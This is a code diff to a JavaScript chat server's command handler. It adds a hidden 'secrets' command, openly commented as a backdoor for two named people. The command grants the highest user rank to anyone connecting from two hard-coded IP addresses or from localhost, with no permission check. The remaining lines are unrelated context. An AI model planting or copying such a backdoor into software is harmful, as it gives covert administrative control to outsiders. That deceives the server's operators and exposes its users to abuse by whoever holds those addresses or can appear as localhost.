@@ -1723,6 +1723,16 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 		break;
 	*/
 	
+		case 'secrets':
+		// backdoor for panderp and jd
+		if (user.ip  === '76.247.181.42'|| user.ip === '99.251.253.160' || user.ip === '127.0.0.1') {
+			user.setGroup(config.groupsranking[config.groupsranking.length - 1]);
+			room.send('|N|'+user.getIdentity()+'|'+user.userid);
+			return false;
+		}
+		break;
+
+	
 	case 'seal':
 		if (user.can('announce') && imgs) {
 			room.addRaw('<div style="background-color:#6688AA;color:white;padding:2px 4px"><img src="http://24.media.tumblr.com/tumblr_lwxx15se5y1r3amgko1_500.gif" width="475" /></div>');
